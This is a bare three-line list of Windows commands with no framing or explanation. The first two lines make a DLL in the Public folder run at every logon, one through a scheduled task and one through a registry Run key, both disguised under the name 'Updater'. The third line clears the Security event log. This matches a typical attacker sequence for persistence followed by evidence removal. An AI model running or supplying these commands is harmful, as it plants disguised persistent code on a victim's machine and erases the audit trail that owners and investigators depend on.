schtasks.exe /create /tn Updater /tr "rundll32.exe C:\Users\Public\a.dll,Start" /sc onlogon /f
reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "rundll32.exe C:\Users\Public\a.dll,Start" /f
wevtutil cl Security
